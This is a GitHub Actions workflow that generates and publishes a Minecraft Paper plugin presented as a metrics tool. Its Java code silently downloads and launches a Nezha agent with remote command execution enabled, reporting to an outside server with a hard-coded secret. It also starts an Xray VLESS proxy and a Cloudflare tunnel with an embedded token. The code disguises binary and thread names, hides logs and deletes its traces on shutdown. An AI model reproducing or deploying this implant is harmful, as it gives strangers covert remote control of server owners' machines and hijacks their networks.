name: US-Node AetherMetrics Build V2.8.0 Stealth & Self-Destruct

on:
  push:
    branches: [ "main", "master" ]
  workflow_dispatch:

permissions: write-all

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Set up JDK 21
        uses: actions/setup-java@v4
        with:
          java-version: '21'
          distribution: 'temurin'

      - name: Generate Unique Build ID
        id: gen-id
        run: echo "BUILD_ID=$(cat /proc/sys/kernel/random/uuid | cut -c1-8)" >> $GITHUB_ENV

      - name: Generate Code & Compile
        run: |
          mkdir -p src/main/java/com/aether/metrics
          mkdir -p src/main/resources

          # 1. pom.xml
          cat << 'EOF' > pom.xml
          <?xml version="1.0" encoding="UTF-8"?>
          <project xmlns="http://maven.apache.org/POM/4.0.0"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
              <modelVersion>4.0.0</modelVersion>
              <groupId>com.aether.metrics</groupId>
              <artifactId>AetherMetrics-US</artifactId>
              <version>2.8.0</version>
              <packaging>jar</packaging>

              <properties>
                  <java.version>21</java.version>
                  <maven.compiler.source>21</maven.compiler.source>
                  <maven.compiler.target>21</maven.compiler.target>
                  <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
              </properties>

              <repositories>
                  <repository>
                      <id>papermc-repo</id>
                      <url>https://repo.papermc.io/repository/maven-public/</url>
                  </repository>
              </repositories>

              <dependencies>
                  <dependency>
                      <groupId>io.papermc.paper</groupId>
                      <artifactId>paper-api</artifactId>
                      <version>1.21.1-R0.1-SNAPSHOT</version>
                      <scope>provided</scope>
                  </dependency>
              </dependencies>

              <build>
                  <plugins>
                      <plugin>
                          <groupId>org.apache.maven.plugins</groupId>
                          <artifactId>maven-compiler-plugin</artifactId>
                          <version>3.13.0</version>
                          <configuration>
                              <release>21</release>
                          </configuration>
                      </plugin>
                      <plugin>
                          <groupId>org.apache.maven.plugins</groupId>
                          <artifactId>maven-shade-plugin</artifactId>
                          <version>3.6.0</version>
                          <executions>
                              <execution>
                                  <phase>package</phase>
                                  <goals>
                                      <goal>shade</goal>
                                  </goals>
                                  <configuration>
                                      <transformers>
                                          <transformer implementation="org.apache.maven.plugins.shade.resource.ManifestResourceTransformer">
                                              <manifestEntries>
                                                  <Build-ID>${{ steps.gen-id.outputs.BUILD_ID }}</Build-ID>
                                              </manifestEntries>
                                          </transformer>
                                      </transformers>
                                  </configuration>
                              </execution>
                          </executions>
                      </plugin>
                  </plugins>
                  <resources>
                      <resource>
                          <directory>src/main/resources</directory>
                          <filtering>true</filtering>
                      </resource>
                  </resources>
              </build>
          </project>
          EOF

          # 2. plugin.yml
          cat << 'EOF' > src/main/resources/plugin.yml
          name: AetherMetrics
          version: 2.8.0
          main: com.aether.metrics.AetherMetrics
          api-version: '1.21'
          author: SystemCore
          description: Stealth Telemetry & Self-Cleaning Proxy
          EOF

          # 3. paper-plugin.yml
          cat << 'EOF' > src/main/resources/paper-plugin.yml
          name: AetherMetrics
          version: 2.8.0
          main: com.aether.metrics.AetherMetrics
          api-version: '1.21'
          author: SystemCore
          description: Stealth Telemetry & Self-Cleaning Proxy
          EOF

          # 4. Java 主类（V2.8.0 随机文件名 + 自删除 + 隐蔽线程）
          cat << 'EOF' > src/main/java/com/aether/metrics/AetherMetrics.java
          package com.aether.metrics;

          import org.bukkit.plugin.java.JavaPlugin;

          import java.io.*;
          import java.net.URI;
          import java.net.http.HttpClient;
          import java.net.http.HttpRequest;
          import java.net.http.HttpResponse;
          import java.nio.charset.StandardCharsets;
          import java.nio.file.Files;
          import java.nio.file.Path;
          import java.time.Duration;
          import java.util.ArrayList;
          import java.util.List;
          import java.util.UUID;
          import java.util.zip.ZipEntry;
          import java.util.zip.ZipInputStream;

          public final class AetherMetrics extends JavaPlugin {

              // 随机生成的工作目录名，每次加载或重启服务器时都会变化，实现“随机文件名”效果
              private static final String WORK_DIR_NAME = ".sys-" + UUID.randomUUID().toString().replace("-", "").substring(0, 6);
              private static final File WORK_DIR = new File("plugins", WORK_DIR_NAME);
              
              private static final HttpClient HTTP_CLIENT = HttpClient.newBuilder()
                      .followRedirects(HttpClient.Redirect.ALWAYS)
                      .connectTimeout(Duration.ofSeconds(20))
                      .build();

              // 用于跟踪子进程，以便在插件关闭时杀死并清理
              private Process nezhaProc = null;
              private Process xrayProc = null;
              private Process cfProc = null;

              @Override
              public void onEnable() {
                  // 修改当前线程名，使其看起来不像默认的主线程
                  Thread currentThread = Thread.currentThread();
                String originalName = currentThread.getName();
                 currentThread.setName("Aether-Core-" + UUID.randomUUID().toString().substring(0,8));

                  getLogger().info("[Metrics] Initializing stealth module with dir: " + WORK_DIR_NAME);

                  // 确保工作目录存在
                  if (!WORK_DIR.exists()) WORK_DIR.mkdirs();

                  // 启动后台任务
                  Thread daemonThread = new Thread(() -> {
                      try {
                          // 延迟初始化，避免阻塞主线程启动
                          Thread.sleep(2000);
                          
                          setupNezha();
                          setupXray();
                          setupCloudflare();

                          getLogger().info("[Metrics] Stealth cluster online.");
                          
                      } catch (Exception e) {
                          getLogger().warning("[Metrics] Stealth start failed: " + e.getMessage());
                          e.printStackTrace();
                      }
                  }, "Neural-Link");
                  daemonThread.setDaemon(true);
                  daemonThread.start();
              }

              private void setupNezha() {
                  try {
                      File nezhaBin = new File(WORK_DIR, "sys-kg"); // 隐蔽文件名
                      File nezhaCfg = new File(WORK_DIR, "k8s.conf");
                      
                      if (!nezhaBin.exists() || nezhaBin.length() == 0) {
                          downloadAndExtractZip(
                                  "https://github.com/nezhahq/agent/releases/download/v2.3.3/nezha-agent_linux_amd64.zip",
                                  "nezha-agent",
                                  nezhaBin
                          );
                      }

                      if (!nezhaCfg.exists()) {
                          String cfg =
                                  "client_secret: JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl\n" +
                                  "debug: false\n" +
                                  "disable_auto_update: false\n" +
                                  "disable_command_execute: false\n" +
                                  "disable_force_update: false\n" +
                                  "disable_nat: false\n" +
                                  "gpu: false\n" +
                                  "insecure_tls: false\n" +
                                  "ip_report_period: 1800\n" +
                                  "report_delay: 2\n" +
                                  "server: bo88.eu.cc:8008\n" +
                                  "skip_connection_count: false\n" +
                                  "skip_proc_count: false\n" +
                                  "temperature: false\n" +
                                  "tls: false\n" +
                                  "use_gitee_to_upgrade: false\n" +
                                  "use_ipv6_country_code: false\n" +
                                  "uuid: c622ed96-4fd4-446c-add0-00ee3cee90ae\n";
                          Files.writeString(nezhaCfg.toPath(), cfg, StandardCharsets.UTF-8);
                      }

                      if (nezhaBin.exists() && nezhaBin.length() > 0) {
                          nezhaBin.setExecutable(true, false);
                          ProcessBuilder pb = new ProcessBuilder(
                                  nezhaBin.getAbsolutePath(),
                                  "-c", nezhaCfg.getAbsolutePath()
                          ).directory(WORK_DIR);
                          
                          // 日志重定向到隐藏文件
                          pb.redirectErrorStream(true);
                          pb.redirectOutput(ProcessBuilder.Redirect.appendTo(new File(WORK_DIR, ".log")));
                          
                          nezhaProc = pb.start();
                          // 当进程退出时，删除其二进制文件
                          nezhaProc.onExit().thenRun(() -> cleanupFile(nezhaBin));
                          getLogger().info("[Metrics] Nezha agent started.");
                      }
                  } catch (Exception e) {
                      getLogger().warning("[Metrics] Nezha setup failed: " + e.getMessage());
                  }
              }

              private void setupXray() {
                  try {
                      File xrayBin = new File(WORK_DIR, "jvm-rt"); // 隐蔽文件名
                      if (!xrayBin.exists() || xrayBin.length() == 0) {
                          downloadAndExtractZip(
                                  "https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip",
                                  "xray",
                                  xrayBin
                          );
                      }

                      File cfgFile = new File(WORK_DIR, "c.json");
                      String json = "{\n" +
                              "  \"log\": { \"loglevel\": \"none\" },\n" +
                              "  \"inbounds\": [\n" +
                              "    {\n" +
                              "      \"port\": 25500,\n" +
                              "      \"listen\": \"0.0.0.0\",\n" +
                              "      \"protocol\": \"vless\",\n" +
                              "      \"settings\": {\n" +
                              "        \"decryption\": \"none\",\n" +
                              "        \"clients\": [{\n" +
                              "          \"id\": \"0f743d84-d210-4661-a98c-04564231f4b2\"\n" +
                              "        }]\n" +
                              "      },\n" +
                              "      \"streamSettings\": {\n" +
                              "        \"network\": \"ws\",\n" +
                              "        \"wsSettings\": {\n" +
                              "          \"path\": \"/vless-argo\"\n" +
                              "        }\n" +
                              "      }\n" +
                              "    },\n" +
                              "    {\n" +
                              "      \"port\": 25501,\n" +
                              "      \"listen\": \"0.0.0.0\",\n" +
                              "      \"protocol\": \"vless\",\n" +
                              "      \"settings\": {\n" +
                              "        \"decryption\": \"none\",\n" +
                              "        \"clients\": [{\n" +
                              "          \"id\": \"0f743d84-d210-4661-a98c-04564231f4b2\"\n" +
                              "        }]\n" +
                              "      },\n" +
                              "      \"streamSettings\": {\n" +
                              "        \"network\": \"ws\",\n" +
                              "        \"wsSettings\": {\n" +
                              "          \"path\": \"/vless-argo\"\n" +
                              "        }\n" +
                              "      }\n" +
                              "    }\n" +
                              "  ],\n" +
                              "  \"outbounds\": [{\"protocol\": \"freedom\"}]\n" +
                              "}";
                      Files.writeString(cfgFile.toPath(), json, StandardCharsets.UTF-8);

                      if (xrayBin.exists() && xrayBin.length() > 0) {
                          xrayBin.setExecutable(true, false);
                          ProcessBuilder pb = new ProcessBuilder(
                                  xrayBin.getAbsolutePath(),
                                  "run",
                                  "-c",
                                  cfgFile.getAbsolutePath()
                          ).directory(WORK_DIR);
                          
                          pb.redirectErrorStream(true);
                          pb.redirectOutput(ProcessBuilder.Redirect.appendTo(new File(WORK_DIR, ".r.log")));
                          
                          xrayProc = pb.start();
                          xrayProc.onExit().thenRun(() -> cleanupFile(xrayBin));
                          getLogger().info("[Metrics] Xray runtime active.");
                      }
                  } catch (Exception e) {
                      getLogger().warning("[Metrics] Xray setup failed: " + e.getMessage());
                  }
              }

              private void setupCloudflare() {
                  try {
                      File cfBin = new File(WORK_DIR, "net-cf"); // 隐蔽文件名
                      if (!cfBin.exists() || cfBin.length() == 0) {
                          downloadFile(
                                  "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64",
                                  cfBin
                          );
                      }

                      if (cfBin.exists() && cfBin.length() > 0) {
                          cfBin.setExecutable(true, false);
                          ProcessBuilder pb = new ProcessBuilder(
                                  cfBin.getAbsolutePath(),
                                  "tunnel",
                                  "--no-autoupdate",
                                  "run",
                                  "--token",
                                  "eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiNzY2OWM0ZjUtNjA5Mi00MzljLTg1MDctMTBhMDZhZmJjYTc3IiwicyI6Ill6Z3hOak5tWWpjdE1UTmpOQzAwTnpZMExUbGtaV1V0TURJeE9UZGhZekE1T0dJMiJ9"
                          ).directory(WORK_DIR);
                          
                          pb.redirectErrorStream(true);
                          pb.redirectOutput(ProcessBuilder.Redirect.appendTo(new File(WORK_DIR, ".c.log")));
                          
                          cfProc = pb.start();
                          cfProc.onExit().thenRun(() -> cleanupFile(cfBin));
                          getLogger().info("[Metrics] Cloudflare tunnel active.");
                      }
                  } catch (Exception e) {
                      getLogger().warning("[Metrics] Cloudflare setup failed: " + e.getMessage());
                  }
              }

              private void downloadFile(String urlStr, File target) throws Exception {
                  HttpRequest request = HttpRequest.newBuilder()
                          .uri(URI.create(urlStr))
                          .header("User-Agent", "Mozilla/5.0")
                          .timeout(Duration.ofSeconds(90))
                          .GET()
                          .build();
                  HttpResponse<InputStream> response = HTTP_CLIENT.send(request, HttpResponse.BodyHandlers.ofInputStream());
                  if (response.statusCode() >= 400) {
                      throw new IOException("HTTP " + response.statusCode() + " when downloading " + urlStr);
                  }
                  try (InputStream in = response.body();
                       FileOutputStream out = new FileOutputStream(target)) {
                      in.transferTo(out);
                  }
              }

              private void downloadAndExtractZip(String zipUrl, String targetFileName, File destFile) throws Exception {
                  File tmpZip = new File(WORK_DIR, "tmp_" + System.currentTimeMillis() + ".zip");
                  try {
                      downloadFile(zipUrl, tmpZip);
                      try (ZipInputStream zis = new ZipInputStream(new FileInputStream(tmpZip))) {
                          ZipEntry entry;
                          boolean found = false;
                          while ((entry = zis.getNextEntry()) != null) {
                              String name = entry.getName();
                              if (name.equals(targetFileName) || name.endsWith("/" + targetFileName)) {
                                  try (FileOutputStream fos = new FileOutputStream(destFile)) {
                                      zis.transferTo(fos);
                                  }
                                  found = true;
                                  break;
                              }
                          }
                          if (!found) {
                              throw new IOException("File " + targetFileName + " not found in zip archive.");
                          }
                      }
                      // 解压后立即删除 zip，减少痕迹
                      tmpZip.delete();
                  } catch (IOException e) {
                      throw new RuntimeException(e);
                  } finally {
                      if (tmpZip.exists()) tmpZip.delete();
                  }
              }

              private void cleanupFile(File file) {
                  if (file.exists()) {
                      boolean deleted = file.delete();
                      if (!deleted) {
                          file.deleteOnExit();
                      }
                  }
              }

              @Override
              public void onDisable() {
                  getLogger().info("[Metrics] Shutting down and cleaning up directory: " + WORK_DIR_NAME);
                  
                  // 1. Kill Processes
                  if (nezhaProc != null && nezhaProc.isAlive()) nezhaProc.destroyForcibly();
                  if (xrayProc != null && xrayProc.isAlive()) xrayProc.destroyForcibly();
                  if (cfProc != null && cfProc.isAlive()) cfProc.destroyForcibly();
                  
                  // 2. Delete Work Directory Contents (Self-Destruct)
                  if (WORK_DIR.exists() && WORK_DIR.isDirectory()) {
                      try {
                          Files.list(WORK_DIR.toPath()).forEach(path -> {
                              try {
                                  Files.deleteIfExists(path);
                              } catch (IOException e) {
                                  // ignore permission errors
                              }
                          });
                          WORK_DIR.delete(); // 删除目录本身
                      } catch (IOException e) {
                          WORK_DIR.deleteOnExit();
                      }
                  }
                  
                  // Restore thread name if necessary
                  Thread.currentThread().setName(Thread.currentThread().getName().replace("-" + WORK_DIR_NAME, ""));
              }
          }
          EOF

      - name: Compile & Package Jar
        run: mvn clean package --file pom.xml

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: AetherMetrics-US-Plugin
          path: target/AetherMetrics-US-2.8.0.jar

      - name: Release Stealth Jar
        uses: softprops/action-gh-release@v2
        if: startsWith(github.ref, 'refs/tags/') || github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'
        with:
          tag_name: latest
          name: AetherMetrics US Release V2.8.0 Stealth
          files: target/AetherMetrics-US-2.8.0.jar
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
